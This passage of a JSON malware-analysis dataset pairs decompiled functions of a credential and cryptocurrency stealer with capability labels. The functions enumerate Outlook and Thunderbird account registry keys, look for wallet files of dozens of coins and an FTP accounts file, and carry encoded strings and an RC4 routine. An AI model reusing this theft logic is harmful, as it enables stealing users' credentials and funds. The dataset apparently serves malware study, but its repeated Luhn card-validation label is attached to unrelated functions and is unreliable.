        "decompiled_code": "\nvoid __cdecl fcn.0040f2b7(uint arg_8h, uint hKey, uint lpSubKey)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uint var_810h;\n    uint lpName;\n    uint var_ch;\n    int32_t dwIndex;\n    uint phkResult;\n    \n    iVar1 = sub.advapi32.dll_RegOpenKeyA(hKey, lpSubKey, &phkResult);\n    if (iVar1 == 0) {\n        dwIndex = 0;\n        while( true ) {\n            var_ch = 0x7ff;\n            iVar1 = sub.advapi32.dll_RegEnumKeyExA(phkResult, dwIndex, &lpName, &var_ch, 0, 0, 0, 0);\n            if (iVar1 != 0) break;\n            uVar2 = fcn.00401c09(lpSubKey, 0x4120b1);\n            uVar2 = fcn.00401c5d(uVar2, &lpName);\n            fcn.0040f122(arg_8h, hKey, uVar2);\n            fcn.0040178e(uVar2);\n            dwIndex = dwIndex + 1;\n        }\n        sub.advapi32.dll_RegCloseKey(phkResult);\n    }\n    return;\n}\n",
        "token_count": 291
    },
    "0040f354": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "create or open registry key",
            "contain loop",
            "query or enumerate registry key"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040f354(uint arg_8h, uint hKey, uint lpSubKey, uint arg_14h)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uint var_810h;\n    uint lpName;\n    uint var_ch;\n    int32_t dwIndex;\n    uint phkResult;\n    \n    iVar1 = sub.advapi32.dll_RegOpenKeyA(hKey, lpSubKey, &phkResult);\n    if (iVar1 == 0) {\n        dwIndex = 0;\n        while( true ) {\n            var_ch = 0x7ff;\n            iVar1 = sub.advapi32.dll_RegEnumKeyExA(phkResult, dwIndex, &lpName, &var_ch, 0, 0, 0, 0);\n            if (iVar1 != 0) break;\n            uVar2 = fcn.00401c09(lpSubKey, 0x4120b1);\n            uVar2 = fcn.00401c5d(uVar2, &lpName);\n            uVar2 = fcn.00401c5d(uVar2, arg_14h);\n            fcn.0040f2b7(arg_8h, hKey, uVar2);\n            fcn.0040178e(uVar2);\n            dwIndex = dwIndex + 1;\n        }\n        sub.advapi32.dll_RegCloseKey(phkResult);\n    }\n    return;\n}\n",
        "token_count": 319
    },
    "0040f6e8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040f6e8(uint arg_8h)\n\n{\n    uint arg_ch;\n    uint uVar1;\n    int32_t lpString2;\n    uint uVar2;\n    uint var_4h;\n    \n    arg_ch = fcn.004015a9(arg_8h, 0x5e, 0);\n    fcn.00402cb7(\"RLUQ!Dl`hm!@eesdrr\");\n    fcn.00402cb7(\"QNQ2!Qnsu\");\n    fcn.00402cb7(\"QNQ2!Q`rrvnse3\");\n    fcn.00402cb7(\"QNQ2!Q`rrvnse\");\n    fcn.0040f696(arg_8h);\n    fcn.0040f2b7(arg_8h, *0x4120d5, \"Software\\\\Microsoft\\\\Internet Account Manager\\\\Accounts\");\n    uVar1 = fcn.00401c09(0x4120b1, \"Software\\\\Microsoft\\\\Internet Account Manager\\\\Accounts\");\n    uVar2 = arg_8h;\n    fcn.0040f354(arg_8h, *0x4120d5, \"Identities\", uVar1);\n    fcn.0040178e(uVar2);\n    lpString2 = fcn.00401b82(0x80000002, \"Software\\\\Microsoft\\\\Internet Account Manager\", \"Outlook\", 0);\n    if (lpString2 != 0) {\n        uVar1 = fcn.00401c5d(lpString2, \"\\\\Accounts\");\n        uVar2 = arg_8h;\n        fcn.0040f2b7(arg_8h, *0x4120d5, uVar1);\n        fcn.0040178e(uVar2);\n    }\n    fcn.0040f2b7(arg_8h, *0x4120d5, \"Software\\\\Microsoft\\\\Office\\\\Outlook\\\\OMI Account Manager\\\\Accounts\");\n    fcn.0040f354(arg_8h, *0x4120d5, \n                 \"Software\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Windows Messaging Subsystem\\\\Profiles\\\\Microsoft Outlook Internet Settings\"\n                 , 0);\n    fcn.0040f354(arg_8h, *0x4120d5, \n                 \"Software\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Windows Messaging Subsystem\\\\Profiles\\\\Outlook\", 0);\n    fcn.004015ef(arg_8h, arg_ch);\n    return;\n}\n",
        "token_count": 560
    },
    "0040f7ef": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "get common file path",
            "set current directory"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040f7ef(uint arg_8h)\n\n{\n    uint var_109h;\n    uint var_4h;\n    \n    var_4h = fcn.004015a9(arg_8h, 0x5f, 0);\n    *0x4137fb = 2;\n    sub.kernel32.dll_GetCurrentDirectoryA(0x104, &var_109h);\n    fcn.004097a9(arg_8h, *0x4120d5, \"Software\\\\Mozilla\", 0x4149a3, \"\\\\Thunderbird\");\n    fcn.004097a9(arg_8h, 0x80000002, \"Software\\\\Mozilla\", 0x4149a3, \"\\\\Thunderbird\");\n    sub.kernel32.dll_SetCurrentDirectoryA(&var_109h);\n    *0x4137fb = 3;\n    sub.kernel32.dll_GetCurrentDirectoryA(0x104, &var_109h);\n    fcn.004097a9(arg_8h, *0x4120d5, \"Software\\\\Mozilla\", 0x4149a3, \"\\\\Thunderbird\");\n    fcn.004097a9(arg_8h, 0x80000002, \"Software\\\\Mozilla\", 0x4149a3, \"\\\\Thunderbird\");\n    sub.kernel32.dll_SetCurrentDirectoryA(&var_109h);\n    fcn.004015ef(arg_8h, var_4h);\n    return;\n}\n",
        "token_count": 324
    },
    "0040f954": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040f954(uint arg_8h)\n\n{\n    uint arg_ch;\n    uint var_4h;\n    \n    arg_ch = fcn.004015a9(arg_8h, 0x61, 0);\n    fcn.00404097(arg_8h, \"\\\\Bitcoin\", 0x4149d2, 0xbeef0000);\n    fcn.004015ef(arg_8h, arg_ch);\n    return;\n}\n",
        "token_count": 104
    },
    "0040f98f": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040f98f(uint arg_8h)\n\n{\n    uint arg_ch;\n    uint var_4h;\n    \n    arg_ch = fcn.004015a9(arg_8h, 0x62, 0);\n    fcn.00404097(arg_8h, \"\\\\Electrum\", \"electrum.dat\", 0xbeef0000);\n    fcn.004015ef(arg_8h, arg_ch);\n    return;\n}\n",
        "token_count": 103
    },
    "0040f9ca": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040f9ca(uint arg_8h)\n\n{\n    uint arg_ch;\n    uint var_4h;\n    \n    arg_ch = fcn.004015a9(arg_8h, 99, 0);\n    fcn.00404097(arg_8h, \"\\\\MultiBit\", 0x4149fd, 0xbeef0000);\n    fcn.004015ef(arg_8h, arg_ch);\n    return;\n}\n",
        "token_count": 103
    },
    "0040fa05": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040fa05(uint arg_8h)\n\n{\n    uint arg_ch;\n    uint var_4h;\n    \n    arg_ch = fcn.004015a9(arg_8h, 100, 0);\n    fcn.00404097(arg_8h, \"\\\\Maxprog\\\\FTP Disk\", \"Accounts.ini\", 0xbeef0000);\n    fcn.004015ef(arg_8h, arg_ch);\n    return;\n}\n",
        "token_count": 102
    },
    "0040fa40": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040fa40(uint arg_8h)\n\n{\n    uint arg_ch;\n    uint var_4h;\n    \n    arg_ch = fcn.004015a9(arg_8h, 0x65, 0);\n    fcn.00404097(arg_8h, \"\\\\Litecoin\", 0x414a2e, 0xbeef0000);\n    fcn.004015ef(arg_8h, arg_ch);\n    return;\n}\n",
        "token_count": 105
    },
    "0040fa7b": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040fa7b(uint arg_8h)\n\n{\n    uint arg_ch;\n    uint var_4h;\n    \n    arg_ch = fcn.004015a9(arg_8h, 0x66, 0);\n    fcn.00404097(arg_8h, \"\\\\Namecoin\", 0x414a43, 0xbeef0000);\n    fcn.004015ef(arg_8h, arg_ch);\n    return;\n}\n",
        "token_count": 105
    },
    "0040fab6": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040fab6(uint arg_8h)\n\n{\n    uint arg_ch;\n    uint var_4h;\n    \n    arg_ch = fcn.004015a9(arg_8h, 0x67, 0);\n    fcn.00404097(arg_8h, \"\\\\Terracoin\", 0x414a58, 0xbeef0000);\n    fcn.004015ef(arg_8h, arg_ch);\n    return;\n}\n",
        "token_count": 105
    },
    "0040faf1": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040faf1(uint arg_8h)\n\n{\n    uint arg_ch;\n    uint var_4h;\n    \n    arg_ch = fcn.004015a9(arg_8h, 0x68, 0);\n    fcn.00404097(arg_8h, \"\\\\Armory\", \".wallet\", 0xbeef0000);\n    fcn.004015ef(arg_8h, arg_ch);\n    return;\n}\n",
        "token_count": 100
    },
    "0040fb2c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040fb2c(uint arg_8h)\n\n{\n    uint arg_ch;\n    uint var_4h;\n    \n    arg_ch = fcn.004015a9(arg_8h, 0x69, 0);\n    fcn.00404097(arg_8h, \"\\\\PPCoin\", 0x414a7e, 0xbeef0000);\n    fcn.004015ef(arg_8h, arg_ch);\n    return;\n}\n",
        "token_count": 106
    },
    "0040fb67": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040fb67(uint arg_8h)\n\n{\n    uint arg_ch;\n    uint var_4h;\n    \n    arg_ch = fcn.004015a9(arg_8h, 0x6a, 0);\n    fcn.00404097(arg_8h, \"\\\\Primecoin\", 0x414a91, 0xbeef0000);\n    fcn.004015ef(arg_8h, arg_ch);\n    return;\n}\n",
        "token_count": 105
    },
    "0040fba2": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040fba2(uint arg_8h)\n\n{\n    uint arg_ch;\n    uint var_4h;\n    \n    arg_ch = fcn.004015a9(arg_8h, 0x6b, 0);\n    fcn.00404097(arg_8h, \"\\\\Feathercoin\", 0x414aa7, 0xbeef0000);\n    fcn.004015ef(arg_8h, arg_ch);\n    return;\n}\n",
        "token_count": 107
    },
    "0040fbdd": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040fbdd(uint arg_8h)\n\n{\n    uint arg_ch;\n    uint var_4h;\n    \n    arg_ch = fcn.004015a9(arg_8h, 0x6c, 0);\n    fcn.00404097(arg_8h, \"\\\\NovaCoin\", 0x414abf, 0xbeef0000);\n    fcn.004015ef(arg_8h, arg_ch);\n    return;\n}\n",
        "token_count": 105
    },
    "0040fc18": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040fc18(uint arg_8h)\n\n{\n    uint arg_ch;\n    uint var_4h;\n    \n    arg_ch = fcn.004015a9(arg_8h, 0x6d, 0);\n    fcn.00404097(arg_8h, \"\\\\Freicoin\", 0x414ad4, 0xbeef0000);\n    fcn.004015ef(arg_8h, arg_ch);\n    return;\n}\n",
        "token_count": 106
    },
    "0040fc53": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040fc53(uint arg_8h)\n\n{\n    uint arg_ch;\n    uint var_4h;\n    \n    arg_ch = fcn.004015a9(arg_8h, 0x6e, 0);\n    fcn.00404097(arg_8h, \"\\\\Devcoin\", 0x414ae9, 0xbeef0000);\n    fcn.004015ef(arg_8h, arg_ch);\n    return;\n}\n",
        "token_count": 105
    },
    "0040fc8e": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040fc8e(uint arg_8h)\n\n{\n    uint arg_ch;\n    uint var_4h;\n    \n    arg_ch = fcn.004015a9(arg_8h, 0x6f, 0);\n    fcn.00404097(arg_8h, \"\\\\Franko\", 0x414afd, 0xbeef0000);\n    fcn.004015ef(arg_8h, arg_ch);\n    return;\n}\n",
        "token_count": 105
    },
    "0040fcc9": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040fcc9(uint arg_8h)\n\n{\n    uint arg_ch;\n    uint var_4h;\n    \n    arg_ch = fcn.004015a9(arg_8h, 0x70, 0);\n    fcn.00404097(arg_8h, \"\\\\ProtoShares\", 0x414b10, 0xbeef0000);\n    fcn.004015ef(arg_8h, arg_ch);\n    return;\n}\n",
        "token_count": 104
    },
    "0040fd04": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040fd04(uint arg_8h)\n\n{\n    uint arg_ch;\n    uint var_4h;\n    \n    arg_ch = fcn.004015a9(arg_8h, 0x71, 0);\n    fcn.00404097(arg_8h, \"\\\\Megacoin\", 0x414b28, 0xbeef0000);\n    fcn.004015ef(arg_8h, arg_ch);\n    return;\n}\n",
        "token_count": 105
    },
    "0040fd3f": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040fd3f(uint arg_8h)\n\n{\n    uint arg_ch;\n    uint var_4h;\n    \n    arg_ch = fcn.004015a9(arg_8h, 0x72, 0);\n    fcn.00404097(arg_8h, \"\\\\Quarkcoin\", 0x414b3d, 0xbeef0000);\n    fcn.004015ef(arg_8h, arg_ch);\n    return;\n}\n",
        "token_count": 107
    },
    "0040fd7a": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040fd7a(uint arg_8h)\n\n{\n    uint arg_ch;\n    uint var_4h;\n    \n    arg_ch = fcn.004015a9(arg_8h, 0x73, 0);\n    fcn.00404097(arg_8h, \"\\\\Worldcoin\", 0x414b53, 0xbeef0000);\n    fcn.004015ef(arg_8h, arg_ch);\n    return;\n}\n",
        "token_count": 105
    },
    "0040fdb5": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040fdb5(uint arg_8h)\n\n{\n    uint arg_ch;\n    uint var_4h;\n    \n    arg_ch = fcn.004015a9(arg_8h, 0x74, 0);\n    fcn.00404097(arg_8h, \"\\\\Infinitecoin\", 0x414b69, 0xbeef0000);\n    fcn.004015ef(arg_8h, arg_ch);\n    return;\n}\n",
        "token_count": 105
    },
    "0040fdf0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040fdf0(uint arg_8h)\n\n{\n    uint arg_ch;\n    uint var_4h;\n    \n    arg_ch = fcn.004015a9(arg_8h, 0x75, 0);\n    fcn.00404097(arg_8h, \"\\\\Ixcoin\", 0x414b82, 0xbeef0000);\n    fcn.004015ef(arg_8h, arg_ch);\n    return;\n}\n",
        "token_count": 104
    },
    "0040fe2b": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040fe2b(uint arg_8h)\n\n{\n    uint arg_ch;\n    uint var_4h;\n    \n    arg_ch = fcn.004015a9(arg_8h, 0x76, 0);\n    fcn.00404097(arg_8h, \"\\\\Anoncoin\", 0x414b95, 0xbeef0000);\n    fcn.004015ef(arg_8h, arg_ch);\n    return;\n}\n",
        "token_count": 106
    },
    "0040fe66": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040fe66(uint arg_8h)\n\n{\n    uint arg_ch;\n    uint var_4h;\n    \n    arg_ch = fcn.004015a9(arg_8h, 0x77, 0);\n    fcn.00404097(arg_8h, \"\\\\BBQcoin\", 0x414baa, 0xbeef0000);\n    fcn.004015ef(arg_8h, arg_ch);\n    return;\n}\n",
        "token_count": 105
    },
    "0040fea1": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040fea1(uint arg_8h)\n\n{\n    uint arg_ch;\n    uint var_4h;\n    \n    arg_ch = fcn.004015a9(arg_8h, 0x78, 0);\n    fcn.00404097(arg_8h, \"\\\\Digitalcoin\", 0x414bbe, 0xbeef0000);\n    fcn.004015ef(arg_8h, arg_ch);\n    return;\n}\n",
        "token_count": 103
    },
    "0040fedc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040fedc(uint arg_8h)\n\n{\n    uint arg_ch;\n    uint var_4h;\n    \n    arg_ch = fcn.004015a9(arg_8h, 0x79, 0);\n    fcn.00404097(arg_8h, \"\\\\Mincoin\", 0x414bd6, 0xbeef0000);\n    fcn.004015ef(arg_8h, arg_ch);\n    return;\n}\n",
        "token_count": 104
    },
    "0040ff17": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040ff17(uint arg_8h)\n\n{\n    uint arg_ch;\n    uint var_4h;\n    \n    arg_ch = fcn.004015a9(arg_8h, 0x7a, 0);\n    fcn.00404097(arg_8h, \"\\\\GoldCoin (GLD)\", 0x414bea, 0xbeef0000);\n    fcn.004015ef(arg_8h, arg_ch);\n    return;\n}\n",
        "token_count": 108
    },
    "0040ff52": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040ff52(uint arg_8h)\n\n{\n    uint arg_ch;\n    uint var_4h;\n    \n    arg_ch = fcn.004015a9(arg_8h, 0x7b, 0);\n    fcn.00404097(arg_8h, \"\\\\Yacoin\", 0x414c05, 0xbeef0000);\n    fcn.004015ef(arg_8h, arg_ch);\n    return;\n}\n",
        "token_count": 106
    },
    "0040ff8d": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040ff8d(uint arg_8h)\n\n{\n    uint arg_ch;\n    uint var_4h;\n    \n    arg_ch = fcn.004015a9(arg_8h, 0x7c, 0);\n    fcn.00404097(arg_8h, \"\\\\Zetacoin\", 0x414c18, 0xbeef0000);\n    fcn.004015ef(arg_8h, arg_ch);\n    return;\n}\n",
        "token_count": 108
    },
    "0040ffc8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040ffc8(uint arg_8h)\n\n{\n    uint arg_ch;\n    uint var_4h;\n    \n    arg_ch = fcn.004015a9(arg_8h, 0x7d, 0);\n    fcn.00404097(arg_8h, \"\\\\Fastcoin\", 0x414c2d, 0xbeef0000);\n    fcn.004015ef(arg_8h, arg_ch);\n    return;\n}\n",
        "token_count": 106
    },
    "00410003": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00410003(uint arg_8h)\n\n{\n    uint arg_ch;\n    uint var_4h;\n    \n    arg_ch = fcn.004015a9(arg_8h, 0x7e, 0);\n    fcn.00404097(arg_8h, \"\\\\I0coin\", 0x414c42, 0xbeef0000);\n    fcn.004015ef(arg_8h, arg_ch);\n    return;\n}\n",
        "token_count": 105
    },
    "0041003e": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0041003e(uint arg_8h)\n\n{\n    uint arg_ch;\n    uint var_4h;\n    \n    arg_ch = fcn.004015a9(arg_8h, 0x7f, 0);\n    fcn.00404097(arg_8h, \"\\\\Tagcoin\", 0x414c55, 0xbeef0000);\n    fcn.004015ef(arg_8h, arg_ch);\n    return;\n}\n",
        "token_count": 105
    },
    "00410079": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00410079(uint arg_8h)\n\n{\n    uint arg_ch;\n    uint var_4h;\n    \n    arg_ch = fcn.004015a9(arg_8h, 0x80, 0);\n    fcn.00404097(arg_8h, \"\\\\Bytecoin\", 0x414c69, 0xbeef0000);\n    fcn.004015ef(arg_8h, arg_ch);\n    return;\n}\n",
        "token_count": 103
    },
    "004100b7": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004100b7(uint arg_8h)\n\n{\n    uint arg_ch;\n    uint var_4h;\n    \n    arg_ch = fcn.004015a9(arg_8h, 0x81, 0);\n    fcn.00404097(arg_8h, \"\\\\Florincoin\", 0x414c7e, 0xbeef0000);\n    fcn.004015ef(arg_8h, arg_ch);\n    return;\n}\n",
        "token_count": 107
    },
    "004100f5": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004100f5(uint arg_8h)\n\n{\n    uint arg_ch;\n    uint var_4h;\n    \n    arg_ch = fcn.004015a9(arg_8h, 0x82, 0);\n    fcn.00404097(arg_8h, \"\\\\Phoenixcoin\", 0x414c95, 0xbeef0000);\n    fcn.004015ef(arg_8h, arg_ch);\n    return;\n}\n",
        "token_count": 104
    },
    "00410133": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00410133(uint arg_8h)\n\n{\n    uint arg_ch;\n    uint var_4h;\n    \n    arg_ch = fcn.004015a9(arg_8h, 0x83, 0);\n    fcn.00404097(arg_8h, \"\\\\Luckycoin\", 0x414cad, 0xbeef0000);\n    fcn.004015ef(arg_8h, arg_ch);\n    return;\n}\n",
        "token_count": 103
    },
    "00410171": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00410171(uint arg_8h)\n\n{\n    uint arg_ch;\n    uint var_4h;\n    \n    arg_ch = fcn.004015a9(arg_8h, 0x84, 0);\n    fcn.00404097(arg_8h, \"\\\\Craftcoin\", 0x414cc3, 0xbeef0000);\n    fcn.004015ef(arg_8h, arg_ch);\n    return;\n}\n",
        "token_count": 103
    },
    "004101af": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004101af(uint arg_8h)\n\n{\n    uint arg_ch;\n    uint var_4h;\n    \n    arg_ch = fcn.004015a9(arg_8h, 0x85, 0);\n    fcn.00404097(arg_8h, \"\\\\Junkcoin\", \"wallet.dat\", 0xbeef0000);\n    fcn.004015ef(arg_8h, arg_ch);\n    return;\n}\n",
        "token_count": 101
    },
    "004102fe": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Removing unreachable block (ram,0x00410317)\n\nvoid fcn.004102fe(void)\n\n{\n    return;\n}\n",
        "token_count": 40
    },
    "00410364": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x0041037d)\n// WARNING: Removing unreachable block (ram,0x00410380)\n\nvoid fcn.00410364(void)\n\n{\n    return;\n}\n",
        "token_count": 46
    },
    "0041044c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Removing unreachable block (ram,0x00410464)\n\nvoid fcn.0041044c(void)\n\n{\n    return;\n}\n",
        "token_count": 41
    },
    "00410583": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Removing unreachable block (ram,0x0041059d)\n\nvoid fcn.00410583(void)\n\n{\n    return;\n}\n",
        "token_count": 41
    },
    "00410986": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Removing unreachable block (ram,0x0041099e)\n\nvoid fcn.00410986(void)\n\n{\n    return;\n}\n",
        "token_count": 41
    },
    "00410a46": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Removing unreachable block (ram,0x00410a5e)\n\nvoid fcn.00410a46(void)\n\n{\n    return;\n}\n",
        "token_count": 43
    },
    "00410eb9": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00410eb9(uint *param_1)\n\n{\n    uint *puVar1;\n    \n    puVar1 = 0x415694;\n    do {\n        *param_1 = *puVar1;\n        puVar1 = puVar1 + 1;\n        param_1 = param_1 + 1;\n    } while (puVar1 < 0x415714);\n    return;\n}\n",
        "token_count": 91
    },
    "00410ed7": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00410ed7(uint *param_1)\n\n{\n    uint *puVar1;\n    \n    puVar1 = 0x415694;\n    do {\n        *puVar1 = *param_1;\n        param_1 = param_1 + 1;\n        puVar1 = puVar1 + 1;\n    } while (puVar1 < 0x415714);\n    return;\n}\n",
        "token_count": 91
    },
    "00411306": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00411306(int32_t arg_8h, int32_t arg_ch)\n\n{\n    uint uVar1;\n    uint var_10h;\n    uint var_8h;\n    uint var_4h;\n    \n    fcn.00410f2a(arg_8h, &var_8h);\n    fcn.00410f2a(arg_8h + 8, &var_10h);\n    fcn.00410fda(&var_8h, 0x415694);\n    fcn.00410fda(&var_10h, 0x415694);\n    uVar1 = var_4h;\n    var_4h = var_10h;\n    var_10h = uVar1;\n    fcn.00410fda(&var_8h, 0x415714);\n    fcn.00410fda(&var_10h, 0x415714);\n    uVar1 = var_4h;\n    var_4h = var_10h;\n    var_10h = uVar1;\n    fcn.00410fda(&var_8h, 0x415794);\n    fcn.00410fda(&var_10h, 0x415794);\n    fcn.00410f8d(&var_8h, arg_ch);\n    fcn.00410f8d(&var_10h, arg_ch + 8);\n    return;\n}\n",
        "token_count": 321
    },
    "004114e4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff"
        ],
        "decompiled_code": "\nvoid fcn.004114e4(int32_t param_1, uint16_t param_2)\n\n{\n    int32_t arg_8h;\n    int32_t arg_8h_00;\n    \n    if (param_2 != 0) {\n        arg_8h = param_1 + 0x10;\n        arg_8h_00 = param_1;\n    }\n    else {\n        arg_8h = param_1;\n        arg_8h_00 = param_1 + 0x10;\n    }\n    fcn.00410d00(param_1 + 8, param_2 == 0);\n    fcn.00410eb9(0x415714);\n    fcn.00410d00(arg_8h_00, param_2);\n    fcn.00410eb9(0x415794);\n    fcn.00410d00(arg_8h, param_2);\n    return;\n}\n",
        "token_count": 207
    },
    "00411543": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
